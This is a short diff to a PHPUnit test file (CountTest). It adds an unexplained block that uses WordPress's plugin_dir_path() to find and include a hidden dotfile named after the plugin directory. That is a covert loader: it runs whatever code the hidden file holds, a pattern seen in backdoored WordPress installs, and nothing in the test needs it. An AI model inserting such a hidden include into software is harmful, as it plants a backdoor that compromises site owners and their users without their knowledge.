@@ -12,6 +12,10 @@
  * @since      Class available since Release 3.7.30
  * @covers     PHPUnit_Framework_Constraint_Count
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class CountTest extends PHPUnit_Framework_TestCase
 {
     public function testCount()
